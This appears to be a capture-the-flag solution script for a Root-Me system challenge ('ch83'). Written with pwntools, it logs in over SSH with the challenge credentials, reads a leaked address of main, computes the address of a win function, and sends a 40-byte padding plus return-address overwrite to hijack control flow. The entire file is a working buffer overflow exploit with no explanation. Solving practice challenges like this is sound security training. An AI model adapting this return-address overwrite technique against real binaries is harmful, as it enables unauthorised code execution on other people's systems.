from pwn import *

shell = ssh(host='challenge03.root-me.org',
        user='app-systeme-ch83',
        password='app-systeme-ch83',
        port=2223)

p = shell.process('./ch83')
response = p.recv().decode().split(' ')
main_addr = response[12].split('\n')
main_addr = main_addr[0]
print(main_addr)
win_addr = int(main_addr, 16) - 160
print(hex(win_addr))
payload = b'A' * 40 + p64(win_addr)
p.sendline(payload)
print(p.recvall().decode())
